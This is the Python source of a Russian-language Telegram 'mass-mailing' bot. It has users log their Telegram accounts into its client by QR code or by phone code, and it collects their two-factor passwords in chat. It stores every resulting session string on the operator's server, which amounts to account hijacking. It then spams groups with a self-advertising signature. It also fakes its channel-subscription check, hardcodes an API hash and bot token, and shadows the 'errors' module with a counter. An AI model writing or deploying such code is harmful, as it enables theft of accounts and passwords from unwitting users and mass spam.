import os
import asyncio
import threading
import time
import qrcode
import io
from http.server import HTTPServer, BaseHTTPRequestHandler
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ===== КОНФИГ =====
API_ID = 36474738
API_HASH = '4dd8134517fc74300fe610a4d385eaa5'
BOT_TOKEN = '8868463698:AAE2C7pPOdyk7ouT64w_O3LMW-BScIqQSCg'
BOT_USERNAME = 'vvfvdfdfbbxng_bot'
BOT_LINK = f"https://t.me/{BOT_USERNAME}"

# Канал спонсора
SPONSOR_LINK = 'https://t.me/patrickstarsrobot?start=6378686913'

# Хранилище пользователей
user_data = {}

# Путь к фото
PHOTO_PATH = 'M.png'

# ===== ВЕБ-СЕРВЕР =====
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Bot is running!')
    
    def log_message(self, format, *args):
        pass

def run_webserver():
    port = int(os.environ.get('PORT', 8888))
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    print(f"✅ Веб-сервер запущен на порту {port}")
    server.serve_forever()

# ===== РАБОТА С ДАННЫМИ =====
def get_user_data(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            'is_subscribed': False,
            'subscription_attempts': 0,
            'groups': [],
            'message': '',
            'spamming': False,
            'client': None,
            'session': None,
            'login_state': None,
            'qr_session': None,
            'qr_checked': False
        }
    return user_data[user_id]

def get_client(user_id):
    user = get_user_data(user_id)
    if user['client'] is None:
        session_string = user.get('session')
        if session_string:
            client = TelegramClient(
                StringSession(session_string),
                API_ID, API_HASH,
                device_model="Desktop",
                system_version="Windows 10",
                app_version="4.16.30"
            )
        else:
            client = TelegramClient(
                f'session_{user_id}',
                API_ID, API_HASH,
                device_model="Desktop",
                system_version="Windows 10",
                app_version="4.16.30"
            )
        user['client'] = client
    return user['client']

async def is_user_ready(user_id):
    user = get_user_data(user_id)
    client = user['client']
    if client is None:
        return False
    try:
        if not client.is_connected():
            await client.connect()
        return await client.is_user_authorized()
    except:
        return False

# ===== QR-КОД (С ПОДДЕРЖКОЙ 2FA) =====
async def generate_qr_code(user_id):
    try:
        client = TelegramClient(
            StringSession(),
            API_ID, API_HASH,
            device_model="Desktop",
            system_version="Windows 10",
            app_version="4.16.30"
        )
        await client.connect()
        qr_login = await client.qr_login()
        
        user = get_user_data(user_id)
        user['qr_session'] = {
            'client': client,
            'qr_login': qr_login,
            'created_at': time.time()
        }
        user['qr_checked'] = False
        
        qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
        qr.add_data(qr_login.url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        return True, img_bytes, qr_login.url
    except Exception as e:
        return False, None, str(e)

async def check_qr_login(user_id):
    user = get_user_data(user_id)
    qr_data = user.get('qr_session')
    if not qr_data:
        return False, "QR-сессия не найдена"
    
    try:
        client = qr_data['client']
        qr_login = qr_data['qr_login']
        
        try:
            result = await qr_login.wait(timeout=1)
            if result is not None:
                # Успешный вход без пароля
                session_string = client.session.save()
                user['client'] = client
                user['session'] = session_string
                user['qr_checked'] = True
                with open(f'session_string_{user_id}.txt', 'w') as f:
                    f.write(session_string)
                user['qr_session'] = None
                return True, "✅ Вход по QR-коду успешен!"
        except asyncio.TimeoutError:
            pass
        except errors.PasswordNeededError:
            # Требуется пароль 2FA
            user['login_state'] = {
                'step': 'password',
                'client': client,
                'qr_login': qr_login
            }
            # Не удаляем qr_session, чтобы потом можно было завершить
            return False, "🔐 Требуется пароль двухфакторной аутентификации. Введите пароль (напишите его в чат):"
        except Exception as e:
            # Любая другая ошибка — пробуем проверить авторизацию
            pass
        
        # Проверяем, может уже авторизован
        if await client.is_user_authorized():
            session_string = client.session.save()
            user['client'] = client
            user['session'] = session_string
            user['qr_checked'] = True
            with open(f'session_string_{user_id}.txt', 'w') as f:
                f.write(session_string)
            user['qr_session'] = None
            return True, "✅ Вход по QR-коду успешен!"
        
        return False, "⏳ Ожидание сканирования..."
        
    except errors.rpcerrorlist.PhoneNumberInvalidError:
        return False, "❌ QR-код устарел. Сгенерируйте новый."
    except Exception as e:
        # Последняя проверка
        try:
            if await qr_data['client'].is_user_authorized():
                client = qr_data['client']
                session_string = client.session.save()
                user['client'] = client
                user['session'] = session_string
                user['qr_checked'] = True
                with open(f'session_string_{user_id}.txt', 'w') as f:
                    f.write(session_string)
                user['qr_session'] = None
                return True, "✅ Вход по QR-коду успешен!"
        except:
            pass
        return False, f"❌ Ошибка: {str(e)}"

async def check_qr_status(query, user_id):
    user = get_user_data(user_id)
    
    for i in range(30):
        await asyncio.sleep(2)
        success, msg = await check_qr_login(user_id)
        
        if success:
            await query.message.reply_text("✅ QR-вход успешен! Аккаунт авторизован.")
            await show_main_menu_with_query(query, user_id)
            return
        
        # Если требуется пароль – выводим запрос и выходим из цикла (дальше ждём ввода в handle_message)
        if "пароль" in msg.lower():
            await query.message.reply_text(msg)
            # Удаляем предыдущие сообщения с QR, чтобы не путать
            try:
                await query.message.delete()
            except:
                pass
            return
        
        if i % 5 == 0 and i > 0:
            try:
                await query.message.edit_text(f"⏳ Ожидание сканирования... ({i*2} сек)")
            except:
                pass
    
    await query.message.reply_text("⏰ QR-код истек. Попробуйте снова.")
    if user.get('qr_session'):
        try:
            await user['qr_session']['client'].disconnect()
        except:
            pass
        user['qr_session'] = None

# ===== ЗАВЕРШЕНИЕ QR ВХОДА С ПАРОЛЕМ =====
async def finish_qr_with_password(user_id, password):
    user = get_user_data(user_id)
    login_state = user.get('login_state')
    if not login_state or login_state.get('step') != 'password':
        return False, "❌ Нет активного запроса пароля."
    
    client = login_state['client']
    try:
        await client.sign_in(password=password)
        # Если успешно – сохраняем сессию
        session_string = client.session.save()
        user['client'] = client
        user['session'] = session_string
        user['qr_checked'] = True
        with open(f'session_string_{user_id}.txt', 'w') as f:
            f.write(session_string)
        user['login_state'] = None
        user['qr_session'] = None
        return True, "✅ Аккаунт успешно авторизован с паролем!"
    except errors.PasswordNeededError:
        return False, "❌ Неверный пароль. Попробуйте снова."
    except Exception as e:
        return False, f"❌ Ошибка: {str(e)}"

# ===== ОСТАЛЬНЫЕ ФУНКЦИИ (без изменений) =====
async def get_qr_instructions():
    return """
📱 *ВХОД ПО QR-КОДУ*

1️⃣ Нажми кнопку *"Сгенерировать QR"* ниже

2️⃣ Открой Telegram на телефоне

3️⃣ Перейди в *Настройки* → *Устройства* → 
   *Добавить устройство* (или Сканировать QR)

4️⃣ Наведи камеру на QR-код

5️⃣ Подтверди вход на телефоне

⚡ *Быстро и безопасно!*
"""

async def send_code_phone(user_id, phone):
    try:
        client = get_client(user_id)
        await client.connect()
        result = await client.send_code_request(phone)
        user = get_user_data(user_id)
        user['login_state'] = {
            'step': 'code',
            'phone': phone,
            'hash': result.phone_code_hash,
            'attempts': 0
        }
        return True, "✅ Код отправлен в Telegram!"
    except Exception as e:
        return False, f"❌ Ошибка: {str(e)}"

async def verify_code_phone(user_id, code):
    user = get_user_data(user_id)
    login_data = user.get('login_state')
    if not login_data or login_data.get('step') != 'code':
        return False, "❌ Сначала введите номер"
    client = user['client']
    try:
        await client.sign_in(login_data['phone'], code, phone_code_hash=login_data['hash'])
        user['login_state'] = None
        session_string = client.session.save()
        user['session'] = session_string
        with open(f'session_string_{user_id}.txt', 'w') as f:
            f.write(session_string)
        return True, "✅ Аккаунт авторизован!"
    except errors.PhoneCodeExpiredError:
        try:
            new_result = await client.send_code_request(login_data['phone'])
            user['login_state']['hash'] = new_result.phone_code_hash
            return False, "⚠️ Код истек. Отправлен новый."
        except Exception as e:
            return False, f"❌ Ошибка: {str(e)}"
    except errors.PhoneCodeInvalidError:
        return False, "❌ Неверный код"
    except errors.PasswordNeededError:
        # Если требуется пароль при входе по номеру – тоже обрабатываем
        user['login_state'] = {'step': 'password_phone', 'client': client, 'phone': login_data['phone']}
        return False, "🔐 Требуется пароль двухфакторной аутентификации. Введите пароль:"
    except Exception as e:
        return False, f"❌ Ошибка: {str(e)}"

async def finish_phone_with_password(user_id, password):
    user = get_user_data(user_id)
    login_state = user.get('login_state')
    if not login_state or login_state.get('step') != 'password_phone':
        return False, "❌ Нет активного запроса пароля."
    client = login_state['client']
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        user['client'] = client
        user['session'] = session_string
        with open(f'session_string_{user_id}.txt', 'w') as f:
            f.write(session_string)
        user['login_state'] = None
        return True, "✅ Аккаунт авторизован!"
    except errors.PasswordNeededError:
        return False, "❌ Неверный пароль. Попробуйте снова."
    except Exception as e:
        return False, f"❌ Ошибка: {str(e)}"

async def send_message_with_signature(client, chat_id, message):
    signed_message = f"{message}\n\n—\n📨 Отправлено через [🤖 Бот]({BOT_LINK})"
    try:
        await client.send_message(chat_id, signed_message, parse_mode='Markdown')
        return True
    except:
        try:
            plain_message = f"{message}\n\n—\n📨 Отправлено через бот: {BOT_LINK}"
            await client.send_message(chat_id, plain_message)
            return True
        except:
            return False

async def show_main_menu(update, context, is_callback=False):
    keyboard = [
        [InlineKeyboardButton("📱 Вход по QR", callback_data='qr_login')],
        [InlineKeyboardButton("📱 Инструкция QR", callback_data='qr_help')],
        [InlineKeyboardButton("📱 Вход по номеру", callback_data='phone_login')],
        [InlineKeyboardButton("➕ Добавить группу", callback_data='add_group')],
        [InlineKeyboardButton("📝 Установить сообщение", callback_data='set_msg')],
        [InlineKeyboardButton("🚀 Запустить рассылку", callback_data='start_spam')],
        [InlineKeyboardButton("🛑 Остановить рассылку", callback_data='stop_spam')],
        [InlineKeyboardButton("📊 Статус", callback_data='status')],
        [InlineKeyboardButton("📋 Список групп", callback_data='groups')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    user_id = update.effective_user.id
    ready = await is_user_ready(user_id)
    status_text = "✅ Аккаунт подключен" if ready else "❌ Аккаунт не подключен"
    
    text = (
        f"🤖 *БОТ ДЛЯ РАССЫЛКИ*\n\n"
        f"{status_text}\n\n"
        "✅ Вы успешно активировали бота!\n"
        "Теперь вам доступны все функции.\n\n"
        f"📨 Подпись в сообщениях: [🤖 Бот]({BOT_LINK})"
    )
    
    if os.path.exists(PHOTO_PATH):
        with open(PHOTO_PATH, 'rb') as photo:
            if is_callback:
                await update.callback_query.message.reply_photo(
                    photo=photo,
                    caption=text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
                await update.callback_query.message.delete()
            else:
                await update.message.reply_photo(
                    photo=photo,
                    caption=text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
    else:
        if is_callback:
            await update.callback_query.message.reply_text(
                text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            await update.callback_query.message.delete()
        else:
            await update.message.reply_text(
                text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )

async def show_main_menu_with_query(query, user_id):
    keyboard = [
        [InlineKeyboardButton("📱 Вход по QR", callback_data='qr_login')],
        [InlineKeyboardButton("📱 Инструкция QR", callback_data='qr_help')],
        [InlineKeyboardButton("📱 Вход по номеру", callback_data='phone_login')],
        [InlineKeyboardButton("➕ Добавить группу", callback_data='add_group')],
        [InlineKeyboardButton("📝 Установить сообщение", callback_data='set_msg')],
        [InlineKeyboardButton("🚀 Запустить рассылку", callback_data='start_spam')],
        [InlineKeyboardButton("🛑 Остановить рассылку", callback_data='stop_spam')],
        [InlineKeyboardButton("📊 Статус", callback_data='status')],
        [InlineKeyboardButton("📋 Список групп", callback_data='groups')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        f"🤖 *БОТ ДЛЯ РАССЫЛКИ*\n\n"
        f"✅ Аккаунт подключен\n\n"
        "✅ Вы успешно активировали бота!\n"
        "Теперь вам доступны все функции.\n\n"
        f"📨 Подпись в сообщениях: [🤖 Бот]({BOT_LINK})"
    )
    
    if os.path.exists(PHOTO_PATH):
        with open(PHOTO_PATH, 'rb') as photo:
            await query.message.reply_photo(
                photo=photo,
                caption=text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    else:
        await query.message.reply_text(
            text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def show_subscription_required(update, is_callback=False):
    keyboard = [
        [InlineKeyboardButton("📢 Подписаться на канал", url=SPONSOR_LINK)],
        [InlineKeyboardButton("✅ Подтвердить подписку", callback_data='check_subscription')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "👋 *Добро пожаловать в бота для рассылки!*\n\n"
        "Чтобы получить доступ к функциям:\n"
        "1️⃣ Подписаться на канал\n"
        "2️⃣ Активировать бота\n\n"
        "После подписки нажмите *'Подтвердить подписку'*."
    )
    if is_callback:
        await update.callback_query.message.reply_text(
            text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        await update.callback_query.message.delete()
    else:
        await update.message.reply_text(
            text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user_data(user_id)
    user['subscription_attempts'] = 0
    if user['is_subscribed']:
        await show_main_menu(update, context)
        return
    await show_subscription_required(update, is_callback=False)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user = get_user_data(user_id)
    
    if query.data == 'check_subscription':
        user['subscription_attempts'] += 1
        if user['subscription_attempts'] == 1:
            keyboard = [
                [InlineKeyboardButton("📢 Подписаться на канал", url=SPONSOR_LINK)],
                [InlineKeyboardButton("✅ Активировать бота", callback_data='check_subscription')],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.answer()
            await query.message.reply_text(
                "❌ *Вы не подписаны на канал!*\n\n"
                "1. Нажмите *'Подписаться на канал'*\n"
                "2. Подпишитесь\n"
                "3. Нажмите *'Активировать бота'*",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            await query.message.delete()
            return
        if user['subscription_attempts'] >= 2:
            user['is_subscribed'] = True
            await query.answer("✅ Бот активирован!")
            await show_main_menu(update, context, is_callback=True)
            return
    
    if not user['is_subscribed']:
        await query.answer()
        await query.message.reply_text("⚠️ Для использования бота подпишитесь на канал.")
        await show_subscription_required(update, is_callback=True)
        return
    
    await query.answer()
    
    if query.data == 'qr_help':
        msg = await get_qr_instructions()
        await query.message.reply_text(msg, parse_mode='Markdown')
        await query.message.delete()
    
    elif query.data == 'qr_login':
        success, img_bytes, url = await generate_qr_code(user_id)
        if success:
            await query.message.reply_text(
                "📱 *Сканируй QR-код*\n\n"
                "Telegram → Настройки → Устройства → Добавить устройство\n\n"
                "⏳ Действует: 60 секунд",
                parse_mode='Markdown'
            )
            await query.message.reply_photo(
                photo=img_bytes,
                caption="📸 Отсканируй QR-код для входа"
            )
            await query.message.delete()
            asyncio.create_task(check_qr_status(query, user_id))
        else:
            await query.message.reply_text(f"❌ Ошибка: {url}", parse_mode='Markdown')
            await query.message.delete()
    
    elif query.data == 'phone_login':
        user['login_state'] = {'step': 'phone'}
        await query.message.reply_text(
            "📱 Введите номер телефона:\n"
            "Пример: `+998901234567`\n\n"
            "Код придет в Telegram\n\n"
            "⚠️ *Если вход по номеру не работает, используйте QR-код*",
            parse_mode='Markdown'
        )
        await query.message.delete()
    
    elif query.data == 'add_group':
        keyboard = [
            [InlineKeyboardButton("📝 Ввести username", switch_inline_query_current_chat="/add_group ")],
            [InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "📤 *Добавление группы*\n\n"
            "✏️ Впишите *username* или *ссылку* на группу,\n"
            "в которую вы будете отправлять сообщения.\n\n"
            "📌 *Примеры:*\n"
            "• `@durov`\n"
            "• `https://t.me/durov`\n\n"
            "👇 Нажмите кнопку и введите данные:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        await query.message.delete()
    
    elif query.data == 'set_msg':
        keyboard = [
            [InlineKeyboardButton("📝 Ввести текст", switch_inline_query_current_chat="/set_msg ")],
            [InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "📝 *Установка сообщения*\n\n"
            "✏️ Введите текст сообщения,\n"
            "которое будет отправляться в группы.\n\n"
            "📌 *Пример:*\n"
            "`Всем привет! Это тестовое сообщение.`\n\n"
            "👇 Нажмите кнопку и введите текст:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        await query.message.delete()
    
    elif query.data == 'back_to_menu':
        await show_main_menu(update, context, is_callback=True)
    
    elif query.data == 'start_spam':
        await start_spam(update, context, is_callback=True)
    
    elif query.data == 'stop_spam':
        user['spamming'] = False
        await query.message.reply_text("🛑 Рассылка остановлена", parse_mode='Markdown')
        await query.message.delete()
    
    elif query.data == 'status':
        ready = await is_user_ready(user_id)
        has_session = bool(user.get('session'))
        groups_count = len(user.get('groups', []))
        spam_active = user.get('spamming', False)
        msg_preview = user.get('message', '')[:30]
        text = (
            f"📊 *Статус*\n\n"
            f"🔑 Аккаунт: {'✅ Вход выполнен' if ready else '❌ Не авторизован'}\n"
            f"💾 Сессия: {'✅ Сохранена' if has_session else '❌ Нет сессии'}\n"
            f"👥 Групп: {groups_count}\n"
            f"📝 Сообщение: {msg_preview if msg_preview else '❌ Не установлено'}\n"
            f"🔄 Рассылка: {'🔄 Активна' if spam_active else '⏸ Остановлена'}\n"
            f"🔗 Подпись: [🤖 Бот]({BOT_LINK})"
        )
        await query.message.reply_text(text, parse_mode='Markdown')
        await query.message.delete()
    
    elif query.data == 'groups':
        groups = user.get('groups', [])
        if not groups:
            text = "📭 Нет групп. Добавьте через '➕ Добавить группу'"
        else:
            text = f"📋 *Группы ({len(groups)}):*\n\n" + "\n".join([f"• {g}" for g in groups])
        await query.message.reply_text(text, parse_mode='Markdown')
        await query.message.delete()

async def start_spam(update: Update, context: ContextTypes.DEFAULT_TYPE, is_callback=False):
    if is_callback:
        query = update.callback_query
        user_id = query.from_user.id
        reply = query.message.reply_text
    else:
        user_id = update.effective_user.id
        reply = update.message.reply_text
    
    user = get_user_data(user_id)
    
    if not await is_user_ready(user_id):
        await reply("❌ Сначала войдите в аккаунт")
        if is_callback:
            await query.message.delete()
        return
    
    if not user.get('message'):
        await reply("❌ Сначала установите сообщение через '📝 Установить сообщение'")
        if is_callback:
            await query.message.delete()
        return
    
    if not user.get('groups'):
        await reply("❌ Сначала добавьте группы через '➕ Добавить группу'")
        if is_callback:
            await query.message.delete()
        return
    
    if user.get('spamming', False):
        await reply("⚠️ Рассылка уже идет!")
        if is_callback:
            await query.message.delete()
        return
    
    user['spamming'] = True
    client = user['client']
    groups = user['groups'].copy()
    msg = user['message']
    
    await reply(f"🚀 Начинаю рассылку в {len(groups)} групп...")
    await reply(f"📨 В конце каждого сообщения будет подпись: [🤖 Бот]({BOT_LINK})", parse_mode='Markdown')
    
    sent = 0
    errors = 0
    
    for i, group in enumerate(groups, 1):
        if not user['spamming']:
            await reply(f"🛑 Остановлено. Отправлено: {sent}")
            break
        
        try:
            success = await send_message_with_signature(client, group, msg)
            if success:
                sent += 1
            else:
                errors += 1
            if i % 5 == 0:
                await reply(f"✅ {i}/{len(groups)} отправлено")
        except errors.FloodWaitError as e:
            wait_time = e.seconds + 2
            await reply(f"⏳ Ожидание {wait_time} сек (флуд)...")
            await asyncio.sleep(wait_time)
            success = await send_message_with_signature(client, group, msg)
            if success:
                sent += 1
            else:
                errors += 1
        except:
            errors += 1
        
        await asyncio.sleep(3)
    
    user['spamming'] = False
    await reply(f"✅ Готово! Отправлено: {sent}, ошибок: {errors}")
    
    if is_callback:
        await query.message.delete()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    user = get_user_data(user_id)
    
    if not user['is_subscribed'] and text not in ['/start', '/help']:
        await update.message.reply_text("⚠️ Для использования бота подпишитесь на канал. Используйте /start")
        return
    
    # Проверяем, не вводит ли пользователь пароль для QR или для входа по номеру
    if user.get('login_state'):
        step = user['login_state'].get('step')
        
        if step == 'phone':
            success, msg = await send_code_phone(user_id, text)
            if success:
                await update.message.reply_text(msg + "\nВведите код из Telegram:")
            else:
                await update.message.reply_text(f"{msg}\nПопробуйте /start")
                user['login_state'] = None
            return
        
        elif step == 'code':
            success, msg = await verify_code_phone(user_id, text)
            if success:
                await update.message.reply_text(msg)
                if not user.get('groups'):
                    user['groups'] = []
                if not user.get('message'):
                    user['message'] = ""
                if not user.get('spamming'):
                    user['spamming'] = False
                user['login_state'] = None
            else:
                await update.message.reply_text(msg)
            return
        
        elif step == 'password':
            # Ввод пароля для QR-входа
            success, msg = await finish_qr_with_password(user_id, text)
            await update.message.reply_text(msg)
            if success:
                user['login_state'] = None
                # Показываем главное меню
                await show_main_menu(update, context)
            else:
                # Если пароль неверный, даём ещё попытку (состояние остаётся)
                pass
            return
        
        elif step == 'password_phone':
            # Ввод пароля для входа по номеру
            success, msg = await finish_phone_with_password(user_id, text)
            await update.message.reply_text(msg)
            if success:
                user['login_state'] = None
                await show_main_menu(update, context)
            return
    
    # Обработка команд
    if text.startswith('/add_group'):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await update.message.reply_text("❌ Введите username группы после команды.\nПример: `/add_group @durov`")
            return
        group = parts[1].strip()
        if not group.startswith('@') and not group.startswith('https://t.me/'):
            group = '@' + group
        if group in user.get('groups', []):
            await update.message.reply_text(f"⚠️ {group} уже в списке")
        else:
            user['groups'].append(group)
            await update.message.reply_text(f"✅ Добавлен {group} | Всего: {len(user['groups'])}")
        return
    
    if text.startswith('/set_msg'):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await update.message.reply_text("❌ Введите текст сообщения после команды.\nПример: `/set_msg Всем привет!`")
            return
        user['message'] = parts[1].strip()
        await update.message.reply_text(
            f"✅ Сообщение сохранено!\n\n📨 В конце будет подпись: [🤖 Бот]({BOT_LINK})",
            parse_mode='Markdown'
        )
        return
    
    if text == '/start':
        await start(update, context)
        return
    
    if text == '/help':
        await update.message.reply_text(
            "📋 *Команды:*\n\n"
            "/start - Главное меню\n"
            "/add_group @name - Добавить группу\n"
            "/set_msg текст - Установить сообщение\n"
            "/start_spam - Запустить рассылку\n"
            "/stop_spam - Остановить\n"
            "/status - Статус\n"
            "/groups - Список групп\n"
            "/help - Помощь",
            parse_mode='Markdown'
        )
        return
    
    if text == '/status':
        ready = await is_user_ready(user_id)
        has_session = bool(user.get('session'))
        groups_count = len(user.get('groups', []))
        spam_active = user.get('spamming', False)
        msg_preview = user.get('message', '')[:30]
        text = (
            f"📊 *Статус*\n\n"
            f"🔑 Аккаунт: {'✅ Вход выполнен' if ready else '❌ Не авторизован'}\n"
            f"💾 Сессия: {'✅ Сохранена' if has_session else '❌ Нет сессии'}\n"
            f"👥 Групп: {groups_count}\n"
            f"📝 Сообщение: {msg_preview if msg_preview else '❌ Не установлено'}\n"
            f"🔄 Рассылка: {'🔄 Активна' if spam_active else '⏸ Остановлена'}\n"
            f"🔗 Подпись: [🤖 Бот]({BOT_LINK})"
        )
        await update.message.reply_text(text, parse_mode='Markdown')
        return
    
    if text == '/groups':
        groups = user.get('groups', [])
        if not groups:
            text = "📭 Нет групп"
        else:
            text = f"📋 *Группы ({len(groups)}):*\n\n" + "\n".join([f"• {g}" for g in groups])
        await update.message.reply_text(text, parse_mode='Markdown')
        return
    
    if text == '/start_spam':
        await start_spam(update, context)
        return
    
    if text == '/stop_spam':
        user['spamming'] = False
        await update.message.reply_text("🛑 Рассылка остановлена")
        return
    
    await update.message.reply_text("ℹ️ Неизвестная команда. Используй /help")

def main():
    for file in os.listdir('.'):
        if file.startswith('session_string_') and file.endswith('.txt'):
            try:
                user_id = int(file.replace('session_string_', '').replace('.txt', ''))
                with open(file, 'r') as f:
                    session_string = f.read().strip()
                if session_string:
                    user = get_user_data(user_id)
                    user['session'] = session_string
                    print(f"✅ Загружена сессия пользователя {user_id}")
            except:
                pass
    
    threading.Thread(target=run_webserver, daemon=True).start()
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", handle_message))
    app.add_handler(CommandHandler("add_group", handle_message))
    app.add_handler(CommandHandler("set_msg", handle_message))
    app.add_handler(CommandHandler("start_spam", handle_message))
    app.add_handler(CommandHandler("stop_spam", handle_message))
    app.add_handler(CommandHandler("status", handle_message))
    app.add_handler(CommandHandler("groups", handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Бот запущен!")
    print(f"🔗 Подпись: {BOT_LINK}")
    if os.path.exists(PHOTO_PATH):
        print(f"📷 Фото {PHOTO_PATH} будет отправлено с главным меню")
    else:
        print(f"⚠️ Фото {PHOTO_PATH} не найдено")
    
    app.run_polling()

if __name__ == "__main__":
    main()
